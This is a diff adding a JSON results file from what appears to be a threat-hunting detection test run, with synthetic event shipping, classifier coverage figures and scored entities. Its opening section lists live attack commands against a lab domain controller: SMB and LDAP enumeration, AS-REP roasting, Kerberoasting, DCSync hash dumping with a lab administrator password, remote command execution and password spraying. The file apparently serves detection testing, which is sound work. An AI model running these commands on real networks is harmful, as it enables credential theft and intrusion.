@@ -1,0 +1,486 @@
+{
+  "plane": "live",
+  "algorithm_version": "loop-milestone-run-r6-v1",
+  "generated_at": 1787225442.560649,
+  "duration_s": 875.5,
+  "hunt_id": "hunt-20260820T111843Z-fd07b72a",
+  "r5a_generate": {
+    "plane": "live",
+    "reason": "",
+    "steps": [
+      {
+        "family": "discovery",
+        "technique": "T1018",
+        "chain_id": "live-discovery-T1018",
+        "step_idx": 0,
+        "command": "nxc smb 10.10.11.21 -u guest -p '' 2>&1 | head -20",
+        "ok": true
+      },
+      {
+        "family": "discovery",
+        "technique": "T1018",
+        "chain_id": "live-discovery-T1018",
+        "step_idx": 1,
+        "command": "nxc smb 10.10.11.21 --shares 2>&1 | head -20",
+        "ok": true
+      },
+      {
+        "family": "credential_access_asrep",
+        "technique": "T1558.004",
+        "chain_id": "live-credaccess-T1558-asrep",
+        "step_idx": 0,
+        "command": "nxc ldap 10.10.11.21 -u guest -p '' --asreproast /tmp/bully_asrep.txt 2>&1 | head -20",
+        "ok": true
+      },
+      {
+        "family": "credential_access_kerberoast",
+        "technique": "T1558.003",
+        "chain_id": "live-credaccess-T1558-kerberoast",
+        "step_idx": 0,
+        "command": "impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip 10.10.11.21 -request 2>&1 | head -20",
+        "ok": true
+      },
+      {
+        "family": "credential_access_dcsync",
+        "technique": "T1003.006",
+        "chain_id": "live-credaccess-T1003-dcsync",
+        "step_idx": 0,
+        "command": "impacket-secretsdump portal.lab/administrator:LabAdmin1!@10.10.11.21 -just-dc-ntlm 2>&1 | head -20",
+        "ok": true
+      },
+      {
+        "family": "network_service_scan",
+        "technique": "T1046",
+        "chain_id": "live-discovery-T1046-nmap",
+        "step_idx": 0,
+        "command": "nmap -sV -p 88,389,445 10.10.11.21 2>&1 | head -30",
+        "ok": true
+      },
+      {
+        "family": "account_discovery",
+        "technique": "T1087.002",
+        "chain_id": "live-discovery-T1087-ldap",
+        "step_idx": 0,
+        "command": "nxc ldap 10.10.11.21 -u guest -p '' --users 2>&1 | head -20",
+        "ok": true
+      },
+      {
+        "family": "lateral_movement",
+        "technique": "T1021.002",
+        "chain_id": "live-lateral-T1021-smb",
+        "step_idx": 0,
+        "command": "nxc smb 10.10.11.21 -u administrator -p 'LabAdmin1!' -x whoami 2>&1 | head -20",
+        "ok": true
+      },
+      {
+        "family": "credential_access_spray",
+        "technique": "T1110.003",
+        "chain_id": "live-credaccess-T1110-spray",
+        "step_idx": 0,
+        "command": "nxc smb 10.10.11.21 -u arya.stark ned.stark jon.snow -p 'Winter1!' --continue-on-success 2>&1 | head -20",
+        "ok": true
+      }
+    ]
+  },
+  "r5b_universe": {
+    "n_sources": 40,
+    "info_levels": [
+      "medium",
+      "rich",
+      "sparse"
+    ],
+    "naming_conventions": [
+      "camel",
+      "dotted",
+      "pascal",
+      "screaming",
+      "snake"
+    ],
+    "benign_count": 3000,
+    "implant_count": 22,
+    "needle_to_hay_ratio": 0.0073,
+    "transformations": [
+      "REVOCABULARY",
+      "REIDENTITY",
+      "REORDER_MINOR",
+      "RESCHEMA",
+      "DOWNLEVEL"
+    ],
+    "scatter_implemented": false
+  },
+  "hec_ship": {
+    "n_sources_shipped": 40,
+    "n_events_shipped": 3022,
+    "all_ok": true,
+    "per_source_ok": {
+      "gen:numeric:umqjr-32": true,
+      "gen:path:gztyq-29": true,
+      "gen:numeric:jhblz-33": true,
+      "gen:freetext:zlgqf-34": true,
+      "gen:freetext:qraxb-3": true,
+      "gen:path:oangs-27": true,
+      "gen:freetext:hmgeo-22": true,
+      "gen:freetext:grgfl-16": true,
+      "gen:numeric:qgmzo-10": true,
+      "gen:syscall:skcvj-21": true,
+      "gen:path:ojzpl-37": true,
+      "gen:path:ejxmp-31": true,
+      "gen:verb:ukpom-6": true,
+      "gen:verb:yupxs-18": true,
+      "gen:freetext:onzzh-30": true,
+      "gen:numeric:azhuz-13": true,
+      "gen:syscall:vubsl-8": true,
+      "gen:freetext:awfpi-9": true,
+      "gen:syscall:wntvn-0": true,
+      "gen:verb:syngk-25": true,
+      "gen:syscall:phkip-35": true,
+      "gen:numeric:dmdjf-28": true,
+      "gen:syscall:owupk-11": true,
+      "gen:freetext:ophvw-12": true,
+      "gen:freetext:eiasc-7": true,
+      "gen:numeric:moybc-38": true,
+      "gen:verb:xklbg-19": true,
+      "gen:verb:vybpx-1": true,
+      "gen:numeric:ibxjx-20": true,
+      "gen:path:xqwws-23": true,
+      "gen:numeric:xbjrd-15": true,
+      "gen:path:jbtfr-26": true,
+      "gen:path:ocvcw-39": true,
+      "gen:freetext:zyoqu-36": true,
+      "gen:freetext:chucv-14": true,
+      "gen:numeric:tjole-5": true,
+      "gen:freetext:hyxnu-17": true,
+      "gen:path:sjdbi-4": true,
+      "gen:numeric:qmrhh-2": true,
+      "gen:verb:binzw-24": true
+    }
+  },
+  "capture": {
+    "plane": "live",
+    "reason": "",
+    "n_records": 2000,
+    "schemas_present": [
+      "OktaIM2:log",
+      "corpus:probe",
+      "linux:auditd",
+      "web:access",
+      "windows:powershell",
+      "windows:security",
+      "windows:sysmon",
+      "windows:system"
+    ]
+  },
+  "correlation": {
+    "n_observations": 8339,
+    "n_resolved_entities": 1584,
+    "n_timelines": 25,
+    "n_cross_source_timelines": 25,
+    "cross_source_share": 1.0
+  },
+  "classifier_coverage_before_after": {
+    "n_examples": 3042,
+    "deterministic_correct": 806,
+    "learned_correct": 2927,
+    "deterministic_coverage": 0.265,
+    "learned_coverage": 0.9622
+  },
+  "scoreboard": {
+    "n_graded": 25,
+    "n_anomalous_unclassified": 22,
+    "n_similar": 0,
+    "n_same": 0,
+    "discovery_bubbled_rate": 0.88,
+    "pyramid_level_distribution": {
+      "L3_BEHAVIOR": 24,
+      "none": 1
+    }
+  },
+  "investigation": {
+    "investigations_run": 5,
+    "handoffs_drafted": 0,
+    "bubbled_trace": [
+      {
+        "entity_id": "ent-4222908184",
+        "relationship": "ANOMALOUS_UNCLASSIFIED",
+        "match_level": "L3_BEHAVIOR",
+        "investigation_verdict": "RULED_OUT"
+      },
+      {
+        "entity_id": "ent-6118958101",
+        "relationship": "ANOMALOUS_UNCLASSIFIED",
+        "match_level": "L3_BEHAVIOR",
+        "investigation_verdict": "RULED_OUT"
+      },
+      {
+        "entity_id": "ent-8292274414",
+        "relationship": "ANOMALOUS_UNCLASSIFIED",
+        "match_level": "L3_BEHAVIOR",
+        "investigation_verdict": "RULED_OUT"
+      },
+      {
+        "entity_id": "ent-1316134447",
+        "relationship": "ANOMALOUS_UNCLASSIFIED",
+        "match_level": "L3_BEHAVIOR",
+        "investigation_verdict": "RULED_OUT"
+      },
+      {
+        "entity_id": "ent-5253676232",
+        "relationship": "ANOMALOUS_UNCLASSIFIED",
+        "match_level": "L3_BEHAVIOR",
+        "investigation_verdict": "RULED_OUT"
+      }
+    ]
+  },
+  "per_row": [
+    {
+      "entity_id": "ent-4222908184",
+      "is_cross_source": true,
+      "n_sources": 7,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-6118958101",
+      "is_cross_source": true,
+      "n_sources": 5,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-8292274414",
+      "is_cross_source": true,
+      "n_sources": 4,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-1316134447",
+      "is_cross_source": true,
+      "n_sources": 3,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-5253676232",
+      "is_cross_source": true,
+      "n_sources": 3,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-6885941005",
+      "is_cross_source": true,
+      "n_sources": 3,
+      "relationship": "DIFFERENT",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.0,
+      "catch": false
+    },
+    {
+      "entity_id": "ent-2152922027",
+      "is_cross_source": true,
+      "n_sources": 3,
+      "relationship": "DIFFERENT",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.0,
+      "catch": false
+    },
+    {
+      "entity_id": "ent-3019041521",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-2775116074",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-5191060775",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-9894233413",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-0276293157",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-8017283338",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-4886316773",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "",
+      "robustness": 0.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-5073077106",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-8057018712",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-0542701384",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-4652977701",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-4326519317",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "DIFFERENT",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.0,
+      "catch": false
+    },
+    {
+      "entity_id": "ent-2658627187",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-2933679559",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-7600329113",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-5192289106",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-7651344473",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    },
+    {
+      "entity_id": "ent-5196508046",
+      "is_cross_source": true,
+      "n_sources": 2,
+      "relationship": "ANOMALOUS_UNCLASSIFIED",
+      "match_level": "L3_BEHAVIOR",
+      "robustness": 1.0,
+      "discovery_value": 0.6,
+      "catch": true
+    }
+  ]
+}
